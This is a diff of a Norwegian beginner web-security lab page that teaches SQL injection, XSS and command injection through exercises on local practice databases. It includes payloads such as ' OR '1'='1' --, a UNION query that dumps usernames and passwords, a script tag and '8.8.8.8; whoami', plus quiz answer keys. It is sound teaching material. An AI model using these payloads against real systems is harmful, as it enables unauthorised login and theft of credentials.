+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den blå knappen 🔵 i lynrunden. Står også i fagord-boksen.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">Konfidensialitet</div></div></div>
           <div class="ans-row" data-p="1" data-a="Integritet|i"><span class="ans-q">Hvilken bokstav brytes når data endres uten lov?</span><input class="ans-in" placeholder="bokstav eller ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den handler om at data skal v&aelig;re uendret.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">i</div></div></div>
-        </div>
-
-      <div class="complete-banner" id="done-web-2"><span>✓</span> Lab 2 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Hvilken knapp fikk saldoen som ble endret til 0 kr? 🟢</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">i</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 3 · INJECTION ═══════════════════════ -->
 <div class="lab-card" id="web-3" data-level="easy">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">03</span><span class="lab-title">Injection — hva er det og hvorfor er det farlig?</span><div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-2">Nivå 3 — Injection intro</div>
-      <div class="theory-block"><div class="theory-title">💉 Hva er injection?</div><div class="theory-text"><p>Injection skjer når en angriper sender inn <strong>kode</strong> der applikasjonen forventer <strong>data</strong>. Det er som å skrive en kommando i et skjema — og systemet kjører den blindt.</p></div></div>
-      <div class="theory-block"><div class="theory-title">⚠️ Hvorfor er det #1 på OWASP Top 10?</div><div class="theory-text"><p>Enkelt å utnytte, og konsekvensene er katastrofale — full tilgang til database, serverfiler eller operativsystemet.</p></div></div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Klikk gjennom de tre injection-typene til høyre</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Forstå hva som skiller SQL Injection, XSS og Command Injection</div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Svar på kunnskapssjekken</div></div>
-      </div>
-      <div class="mini-quiz"><div class="mini-quiz-title">Kunnskapssjekk</div><div class="quiz-q">Hva er kjernen i et injection-angrep?</div><div class="quiz-opts"><button class="quiz-opt" onclick="mq(this,false)">Angriperen gjetter et passord</button><button class="quiz-opt" onclick="mq(this,true)">Angriperen sender kode der applikasjonen forventer data</button><button class="quiz-opt" onclick="mq(this,false)">Angriperen avlytter nettverkstrafikken</button></div><div class="quiz-fb"></div></div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">Injection-typer</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#7f1d1d"><span class="ts-logo">💉 Injection</span></div><div class="ts-body">
-          <div style="display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap">
-            <button onclick="injT('sql')" id="inj-sql" class="ts-btn" style="background:#dc2626;font-size:12px">SQL Injection</button>
-            <button onclick="injT('xss')" id="inj-xss" class="ts-btn" style="background:#6b7280;font-size:12px">XSS</button>
-            <button onclick="injT('cmd')" id="inj-cmd" class="ts-btn" style="background:#6b7280;font-size:12px">Command Injection</button>
-          </div>
-          <div id="inj-content"><div class="ts-card"><div class="ts-card-title">SQL Injection</div><div style="background:#f0fdf4;border:1px solid #86efac;border-radius:5px;padding:8px;font-family:monospace;font-size:12px;color:#166534;margin-bottom:8px">ola.nordmann</div><div style="background:#fef2f2;border:1px solid #fca5a5;border-radius:5px;padding:8px;font-family:monospace;font-size:12px;color:#991b1b;margin-bottom:8px">' OR '1'='1</div><div style="background:#1a1a2e;border-radius:5px;padding:8px;font-family:monospace;font-size:11px;color:#e2e8f0">WHERE username = <span style="color:#f87171">'' OR '1'='1'</span></div><div style="font-size:11px;color:#dc2626;margin-top:8px;font-weight:600">→ Alltid sant — alle brukere returneres!</div></div></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">03</span>
+  <span class="lab-title">Injection — hva er det og hvorfor er det farlig?</span>
+  <div class="lab-meta"><span class="badge badge-easy">Lett</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-2">Nivå 3 — Injection intro</div>
+<p class="e-hook">Et skjema ber om navnet ditt. Du skriver ikke et navn. Du skriver en <b>ordre</b> 😈 Hvem adlyder?</p>
+
+<div class="e-spill" data-spill="par" data-tittel="🔗 Hvem blir lurt?" data-oppgave="Venstre: noe en angriper skriver i et felt. Koble det til programmet som blir lurt til å adlyde.">
+  <div class="pr-par" data-forklar="Fnutten ' avslutter teksten i SQL-en. Resten blir SQL. Det er SQL injection."><span><code>' OR '1'='1</code></span><span>🗄️ Databasen</span></div>
+  <div class="pr-par" data-forklar="Et script-element. Nettleseren til den som åpner siden kjører det. Det er XSS."><span><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></span><span>🌐 Nettleseren til offeret</span></div>
+  <div class="pr-par" data-forklar="; betyr «og så en kommando til». Skallet på serveren kjører whoami. Det er command injection."><span><code>8.8.8.8; whoami</code></span><span>💻 Skallet på serveren</span></div>
+  <div class="pr-par" data-forklar="Bare bokstaver og et mellomrom. Ingen spesialtegn, ingen ordre."><span><code>Ola Nordmann</code></span><span>😇 Ingen. Det er bare data</span></div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>Injection</b>: angriperen sender <b>kode</b> der programmet ventet <b>data</b>. Tre kjente typer:<br>
+🗄️ <b>SQL injection</b> lurer databasen.<br>
+🌐 <b>XSS</b> (cross-site scripting) lurer nettleseren.<br>
+💻 <b>Command injection</b> lurer skallet, og gir kontroll over operativsystemet.
+</div>
+<p class="e-sikker">🔥 Injection har stått på <b>OWASP Top 10</b>, lista over de vanligste feilene i nettsider, hver gang lista er laget.</p>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="echo Hei $USER" data-mal="Be skallet si hei til deg:"><template class="ut">Hei <span class="h1">kali</span></template><template class="forklar"><p>Du skrev <code>$USER</code>, men skallet byttet det ut med <b>kali</b>. <code>$</code> er en <b>ordre</b> til skallet: «sett inn verdien her» 🪄</p></template></div>
+<div class="tm-o" data-cmd="echo 'Hei $USER'" data-mal="Nå med fnutter rundt:"><template class="ut">Hei <span class="h1">$USER</span></template><template class="forklar"><p>Fnuttene sier «dette er bare tekst». Samme tegn, men nå er det <b>data</b>, ikke en ordre.</p></template></div>
+<div class="tm-o" data-cmd="python3 -c 'print(2+2)'" data-alias="python3 -c &quot;print(2+2)&quot;" data-mal="Samme lek i Python:"><template class="ut"><span class="h2">4</span></template><template class="forklar"><p><code>2+2</code> uten anførselstegn er <b>kode</b>. Python regner.</p></template></div>
+<div class="tm-o" data-cmd="python3 -c 'print(&quot;2+2&quot;)'" data-alias="python3 -c &quot;print('2+2')&quot;" data-mal="Nå med anførselstegn rundt 2+2." data-skjult data-hint="Som i oppdrag 3, men skriv <code>&quot;2+2&quot;</code> inni parentesen."><template class="ut"><span class="h2">2+2</span></template><template class="forklar"><p>Med anførselstegn er det <b>data</b>, en tekst. Python regner ikke. Injection handler om å lure programmet til å glemme denne grensen 🧱</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="hei kali|kali"><span class="ans-q">Hva skrev <code>echo Hei $USER</code> ut?</span><input class="ans-in" placeholder="to ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Utskriften i oppdrag 1.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">Hei kali</div></div></div>
+<div class="ans-row" data-p="1" data-a="2+2"><span class="ans-q">Hva skrev Python ut når 2+2 sto i anførselstegn?</span><input class="ans-in" placeholder="kort svar"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Oppdrag 4. Regnet Python?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">2+2</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Åpne terminalen (<b>Ctrl + Alt + T</b>) og skriv de samme kommandoene. Heter brukeren din noe annet enn kali, ser du ditt eget navn. Det er helt riktig!<p class="e-win">Windows (PowerShell): <code>echo "Hei $env:USERNAME"</code> og <code>echo 'Hei $env:USERNAME'</code></p></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="command injection|command"><span class="ans-q">Hvilken injection-type gir kontroll over operativsystemet?</span><input class="ans-in" placeholder="to ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tolkeren er et skall, ikke en database.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">command injection</div></div></div>
-        </div>
-
-      <div class="complete-banner" id="done-web-3"><span>✓</span> Lab 3 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Hvilken payload koblet du til 💻 skallet i par-spillet?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">command injection</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 4 · LOGIN BYPASS ═══════════════════════ -->
 <div class="lab-card" id="web-4" data-level="medium">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">04</span><span class="lab-title">SQL Injection — login bypass</span><div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-3">Nivå 4 — Login bypass</div>
-      <div class="theory-block"><div class="theory-title">🗄️ Hvordan SQL fungerer</div><div class="theory-text"><p>Når du logger inn kjøres en SQL-spørring mot databasen. Problemet oppstår når brukerinput settes inn direkte uten å renses.</p></div>
-        <div class="code-block"><span class="sql-kw">SELECT</span> * <span class="sql-kw">FROM</span> users <span class="sql-kw">WHERE</span> username=<span class="sql-str">'[input]'</span> <span class="sql-kw">AND</span> password=<span class="sql-str">'[input]'</span></div>
-      </div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Prøv å logge inn med brukernavn <code>admin</code> og feil passord</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Prøv payloaden <code>' OR '1'='1' --</code> som brukernavn</div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Se SQL-spørringen i sanntid og forstå hvorfor det virker</div></div>
-        <div class="obj-item"><div class="obj-num">4</div><div class="obj-text">Hva gjør <code>--</code> på slutten?</div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">🔒 bankapp.no/login</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#1e3a5f"><span class="ts-logo">🏦 BankApp</span></div><div class="ts-body">
-          <div class="ts-card" style="max-width:340px;margin:0 auto">
-            <div class="ts-card-title">Logg inn</div>
-            <span class="ts-label">Brukernavn</span>
-            <input class="ts-input" id="sql-user" placeholder="brukernavn" style="margin-bottom:8px" oninput="sqlUQ()">
-            <span class="ts-label">Passord</span>
-            <input class="ts-input" id="sql-pass" placeholder="passord" oninput="sqlUQ()">
-            <button class="ts-btn" style="background:#1e3a5f;width:100%;margin-top:12px" onclick="sqlLogin()">Logg inn</button>
-            <div id="sql-result" style="display:none;margin-top:10px;padding:10px;border-radius:6px;font-size:13px;font-weight:600"></div>
-          </div>
-          <div class="ts-card" style="background:#0a0c10;margin-top:8px">
-            <div style="font-size:10px;color:#6b7280;text-transform:uppercase;letter-spacing:.1em;margin-bottom:6px">SQL-spørring:</div>
-            <div id="sql-query" style="font-family:monospace;font-size:11px;color:#9ca3af;line-height:1.7;word-break:break-all">SELECT * FROM users WHERE username='<span style="color:#60a5fa"></span>' AND password='<span style="color:#60a5fa"></span>'</div>
-            <div id="sql-warn" style="font-size:11px;margin-top:6px"></div>
-          </div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">04</span>
+  <span class="lab-title">SQL Injection — login bypass</span>
+  <div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-3">Nivå 4 — Login bypass</div>
+<p class="e-hook">Logge inn som admin uten å kunne passordet? Med 15 tegn i brukernavnfeltet 🪄</p>
+
+<div class="e-spill" data-spill="chat" data-tittel="💬 Innlogging hos BankApp">
+  <div class="ch-item" data-fra="sys">🏦 BankApp lager SQL ved å lime inn det du skriver:<br><code>SELECT * FROM users WHERE username='<b>[brukernavn]</b>' AND password='<b>[passord]</b>'</code></div>
+  <div class="ch-item" data-fra="pc" data-navn="😇 Ola">Brukernavn: <code>admin</code> · Passord: <code>feil</code></div>
+  <div class="ch-item" data-fra="nabo" data-navn="🗄️ Databasen">Jeg leter etter username='admin' AND password='feil'… 0 rader. ❌ Ingen slipper inn.</div>
+  <div class="ch-item" data-stopp="🦹 Nå prøver en angriper…"></div>
+  <div class="ch-item" data-fra="ond" data-navn="🦹 Angriper">Brukernavn: <code>' OR '1'='1' --</code> · Passord: <code>x</code></div>
+  <div class="ch-item" data-fra="sys">Limt inn blir det:<br><code>WHERE username='' OR '1'='1' --' AND password='x'</code></div>
+  <div class="ch-item" data-fra="nabo" data-navn="🗄️ Databasen">Er '1'='1'? Ja, alltid! Og etter <code>--</code> er resten bare en kommentar. Den hopper jeg over. Her er alle brukerne 📋</div>
+  <div class="ch-item" data-fra="pc" data-navn="🏦 BankApp">Første rad er admin. Velkommen, admin! 🎉</div>
+  <div class="ch-item" data-fra="ond" data-navn="🦹 Angriper">Uten passord 😏</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+Dette er <b>SQL injection</b>: input som endrer selve spørringen.<br>
+<code>OR</code> legger til et alternativ. <code>'1'='1'</code> er alltid sant, så hele betingelsen blir sann.<br>
+<code>--</code> starter en <b>kommentar</b> i SQL. Alt etter blir ignorert, også passordsjekken.
+</div>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="sqlite3 bank.db &quot;SELECT username FROM users WHERE username='admin' AND password='feil';&quot;" data-mal="Logg inn som admin med feil passord, rett i databasen:"><template class="ut"><span class="dim">(ingen linjer)</span></template><template class="forklar"><p>Ingen rader = ingen bruker passet. Innloggingen avvises ✋</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 bank.db &quot;SELECT username FROM users WHERE username='' OR '1'='1' --' AND password='x';&quot;" data-mal="Nå med payloaden som brukernavn:"><template class="ut"><span class="h1">admin
+lars
+kari</span></template><template class="forklar"><p>Alle brukerne kom ut 😱 Nettsiden tar som regel den første raden, og der står admin.</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 bank.db &quot;SELECT username FROM users WHERE username='admin' --' AND password='x';&quot;" data-mal="Bare admin, takk: brukernavn <code>admin' --</code>." data-skjult data-hint="Ta kommandoen fra oppdrag 2. Bytt <code>'' OR '1'='1'</code> med <code>'admin'</code>."><template class="ut"><span class="h1">admin</span></template><template class="forklar"><p>Bare admin, og passordsjekken ble en kommentar. Kort og ondt 🦹</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="3|tre"><span class="ans-q">Hvor mange brukernavn kom ut med payloaden i oppdrag 2?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tell de gule linjene.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">3</div></div></div>
+<div class="ans-row" data-p="1" data-a="0|null|ingen"><span class="ans-q">Hvor mange rader fikk du med riktig brukernavn og feil passord?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Oppdrag 1.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">0</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Mangler <code>sqlite3</code>? Kjør <code>sudo apt install sqlite3</code>. Lag databasen: skriv <code>sqlite3 bank.db</code>, lim inn linja under, og avslutt med <code>.quit</code>. Så kan du kjøre de samme kommandoene.
+<pre class="e-kode">CREATE TABLE users(id INTEGER PRIMARY KEY, username TEXT, password TEXT); INSERT INTO users(username,password) VALUES('admin','password123'),('lars','Summer2024!'),('kari','qwerty123');</pre></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a=" or"><span class="ans-q">Hvilken SQL-operator gjør betingelsen alltid sann?</span><input class="ans-in" placeholder="en operator"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">To bokstaver, og den legger til et alternativ.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">or</div></div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Ordet mellom <code>''</code> og <code>'1'='1'</code> i chatten. To bokstaver.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">or</div></div></div>
           <div class="ans-row" data-p="1" data-a="--"><span class="ans-q">Hvilke to tegn starter en SQL-kommentar i payloaden?</span><input class="ans-in" placeholder="to tegn"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">To like tegn etter hverandre.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">--</div></div></div>
-        </div>
-
-      <div><button class="hint-btn" onclick="toggleHint(this)">▶ Hint</button><div class="hint-box"><code>--</code> er en SQL-kommentar. Alt etter ignoreres — passord-sjekken nullstilles.</div>
-        <button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box"><code>' OR '1'='1' --</code> gjør betingelsen alltid sann → innlogget.</div>
-      </div>
-      <div class="complete-banner" id="done-web-4"><span>✓</span> Lab 4 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Databasen i chatten sa at alt etter disse to tegnene bare er en kommentar.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">--</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 5 · UNION ═══════════════════════ -->
 <div class="lab-card" id="web-5" data-level="medium">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">05</span><span class="lab-title">SQL Injection — dump data med UNION</span><div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-3">Nivå 5 — UNION attack</div>
-      <div class="theory-block"><div class="theory-title">🔗 UNION i SQL</div><div class="theory-text"><p><code>UNION</code> kombinerer resultater fra to SQL-spørringer. En angriper kan hente data fra andre tabeller — som brukertabellen med alle passord.</p></div>
-        <div class="code-block"><span class="sql-kw">SELECT</span> name <span class="sql-kw">FROM</span> products <span class="sql-kw">WHERE</span> id=<span class="sql-str">'1'</span>
-<span class="sql-kw">UNION SELECT</span> username, password <span class="sql-kw">FROM</span> users<span class="sql-com"> --</span></div>
-      </div>
-      <div><div class="obj-title">Mål</div>
-        <div class="obj-item"><div class="obj-num">1</div><div class="obj-text">Søk normalt med ID 1, 2, 3</div></div>
-        <div class="obj-item"><div class="obj-num">2</div><div class="obj-text">Injiser: <code>1' UNION SELECT username, password FROM users --</code></div></div>
-        <div class="obj-item"><div class="obj-num">3</div><div class="obj-text">Se alle brukere og passord i søkeresultatet</div></div>
-      </div>
-        <div class="term-block"><div class="fake-browser" style="flex-direction:column">
-        <div class="fake-bar"><div class="fake-dots"><div class="fdot fdot-r"></div><div class="fdot fdot-y"></div><div class="fdot fdot-g"></div></div><div class="fake-url">shopnow.no/products?id=</div></div>
-        <div class="site-wrap"><div class="ts"><div class="ts-nav" style="background:#065f46"><span class="ts-logo">🛒 ShopNow</span></div><div class="ts-body">
-          <div style="display:flex;gap:8px;margin-bottom:12px"><input class="ts-input" id="union-q" placeholder="Produkt-ID (prøv: 1)" value="1"><button class="ts-btn" style="background:#065f46" onclick="unionS()">Søk</button></div>
-          <div id="union-res"><div class="ts-card"><div class="ts-card-title">Laptop Pro 15</div><div class="ts-card-sub">12 999 kr</div></div></div>
-        </div></div></div>
-      </div></div><div class="ans-block">
-          <div class="obj-title">Svar</div>
+<div class="lab-header" onclick="toggleTask(this)">
+  <span class="lab-num">05</span>
+  <span class="lab-title">SQL Injection — dump data med UNION</span>
+  <div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="lab-chev">&#9654;</span></div>
+</div>
+<div class="lab-body"><div class="lab-flow">
+<div class="level-badge lb-3">Nivå 5 — UNION attack</div>
+<p class="e-hook">Nettbutikken viser deg ett produkt om gangen 🛒 Kan du få den til å vise <b>passordene</b> i stedet?</p>
+
+<div class="e-spill" data-spill="rekkefolge" data-tittel="🧩 Bygg UNION-angrepet" data-oppgave="Søket er <code>products?id=1</code>. Sett stegene til angriperen i riktig rekkefølge.">
+  <div class="rf-item" data-forklar="Først: se hvordan siden oppfører seg normalt.">Søk med <code>id=1</code>. Siden viser Laptop Pro 15 🛒</div>
+  <div class="rf-item" data-forklar="En SQL-feil betyr at det du skriver havner rett i SQL-en.">Skriv <code>1'</code>. Siden svarer med en SQL-feil 💡</div>
+  <div class="rf-item" data-forklar="UNION krever like mange kolonner på begge sider.">Finn ut hvor mange kolonner spørringen henter 🔢</div>
+  <div class="rf-item" data-forklar="Nå limes brukertabellen under produktene.">Skriv <code>1' UNION SELECT username, password FROM users --</code></div>
+  <div class="rf-item" data-forklar="Konfidensialiteten er brutt.">Brukernavn og passord dukker opp i produktlista 😱</div>
+</div>
+
+<div class="e-fagord"><span class="t">📌 Fagord</span>
+<b>UNION</b> limer resultatet av en ekstra spørring under den første. Begge sider må ha like mange <b>kolonner</b>. Den ekstra spørringen kan hente fra en helt annen tabell, for eksempel <code>users</code>.
+</div>
+
+<div class="e-spill" data-spill="terminal">
+<div class="tm-o" data-cmd="sqlite3 shop.db &quot;SELECT name, price FROM products WHERE id='1';&quot;" data-mal="Søk normalt, som nettbutikken gjør:"><template class="ut"><span class="h2">Laptop Pro 15</span>|<span class="h2">12 999 kr</span></template><template class="forklar"><p>To kolonner, skilt med <code>|</code>: navn og pris.</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 shop.db &quot;SELECT name FROM products WHERE id='1' UNION SELECT username, password FROM users --';&quot;" data-mal="En spørring med bare <b>én</b> kolonne, pluss UNION med to:"><template class="ut"><span style="color:var(--red)">Error: in prepare, SELECTs to the left and right of UNION <span class="h1">do not have the same number of result columns</span></span></template><template class="forklar"><p>Venstre side har 1 kolonne, høyre har 2. Databasen nekter. Derfor må angriperen telle kolonner først 🔢</p></template></div>
+<div class="tm-o" data-cmd="sqlite3 shop.db &quot;SELECT name, price FROM products WHERE id='1' UNION SELECT username, password FROM users --';&quot;" data-mal="Nå med to kolonner på begge sider." data-skjult data-hint="Som i oppdrag 2, men skriv <code>name, price</code> i stedet for bare <code>name</code>."><template class="ut">Laptop Pro 15|12 999 kr
+<span class="h1">admin|password123
+kari|qwerty123
+lars|Summer2024!</span></template><template class="forklar"><p>Produktet øverst, og så hele brukertabellen under 😱 Nettbutikken ville vist passordene som om de var produkter.</p></template></div>
+</div>
+
+<div class="ans-block les"><div class="obj-title">🔎 Les av øve-terminalen</div>
+<div class="ans-row" data-p="1" data-a="2|to"><span class="ans-q">Hvor mange kolonner må hver side av UNION ha her?</span><input class="ans-in" placeholder="et tall"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Tell kolonnene i oppdrag 1: navn og…?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">2</div></div></div>
+<div class="ans-row" data-p="1" data-a="Summer2024!|summer2024"><span class="ans-q">Hva er passordet til lars?</span><input class="ans-in" placeholder="et passord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button><div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Den siste gule linja i oppdrag 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">Summer2024!</div></div></div>
+</div>
+
+<div class="e-kali"><b class="t">🐉 Nå på ekte Kali</b>Lag nettbutikken: skriv <code>sqlite3 shop.db</code>, lim inn linja under, og avslutt med <code>.quit</code>. Så kan du kjøre de samme kommandoene.
+<pre class="e-kode">CREATE TABLE products(id INTEGER, name TEXT, price TEXT); INSERT INTO products VALUES(1,'Laptop Pro 15','12 999 kr'),(2,'Trådløs mus','299 kr'),(3,'USB-hub','199 kr'); CREATE TABLE users(username TEXT, password TEXT); INSERT INTO users VALUES('admin','password123'),('lars','Summer2024!'),('kari','qwerty123');</pre></div>
+
+<div class="ans-block"><div class="obj-title">✍️ Din tur</div>
           <div class="ans-row" data-p="1" data-a="UNION"><span class="ans-q">Hvilket SQL-nøkkelord slår sammen to spørringer?</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Det limer resultatet av din spørring under den opprinnelige.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">union</div></div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Ordet som limte brukertabellen under produktet i oppdrag 3.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv">union</div></div></div>
           <div class="ans-row" data-p="1" data-a=" konfidensialitet"><span class="ans-q">Hvilken del av CIA-triaden brytes her?</span><input class="ans-in" placeholder="ett ord"><span class="ans-mark"></span><button class="submit-btn" onclick="clSubmit(this)">Svar</button>
-          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Data ble lest av noen som ikke skulle se dem.</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv"> konfidensialitet</div></div></div>
-        </div>
-
-      <div><button class="sol-btn" onclick="toggleSolution(this)">▶ Vis løsning</button><div class="sol-box"><code>1' UNION SELECT username, password FROM users --</code><br>Konfidensialitet brytes.</div></div>
-      <div class="complete-banner" id="done-web-5"><span>✓</span> Lab 5 fullført!</div>
-    </div></div>
+          <div class="ah"><button class="ah-btn" onclick="aTip(this)">&#9654; Hint</button><div class="ah-box tip">Passord ble lest av noen som ikke skulle se dem. Hvilken knapp 🔵 var det i lynrunden i oppgave 2?</div><button class="ah-btn sv fasit-btn" onclick="aTip(this)">&#9654; Fasit</button><div class="ah-box sv"> konfidensialitet</div></div></div>
+</div>
+</div></div>
 </div>
 
+<!-- ═══════════════════════ 6 · URL-PARAMETER ═══════════════════════ -->
 <div class="lab-card" id="web-6" data-level="medium">
-  <div class="lab-header" onclick="toggleTask(this)"><span class="lab-num">06</span><span class="lab-title">SQL Injection — via URL-parameter</span><div class="lab-meta"><span class="badge badge-medium">Middels</span><span class="lab-chev">▶</span></div></div>
-  <div class="lab-body"><div class="lab-flow">
-      <div class="level-badge lb-3">Nivå 6 — URL-parameter injection</div>
